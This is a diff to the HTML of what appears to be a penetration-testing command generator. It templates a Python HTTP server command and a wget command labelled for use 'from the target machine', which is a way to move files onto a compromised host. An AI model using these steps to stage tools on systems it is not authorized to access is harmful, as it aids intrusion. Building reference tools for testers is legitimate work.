@@ -364,7 +364,7 @@
                     <h2>Create a local file with python</h2>
                     <h4>Codes to use on your machine to create a local server</h4>
                     <div class="code-snippet">
-                        <code>python3 -m http.server 8888</code>
+                        <code class="templated" data-template="python3 -m http.server {{port}}"></code>
                         <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">
                             <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18"
                                 fill="currentColor">
@@ -375,7 +375,7 @@
                     </div>
                     <h4>Access the server from the target machine</h4>
                     <div class="code-snippet">
-                        <code class="templated" data-template="wget http://<YOUR IP>:8888">test</code>
+                        <code class="templated" data-template="wget http://{{local}}:{{port}}"></code>
                         <button class="copy-icon" onclick="copyCommand(this)" aria-label="Copy to clipboard">
                             <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18"
                                 fill="currentColor">
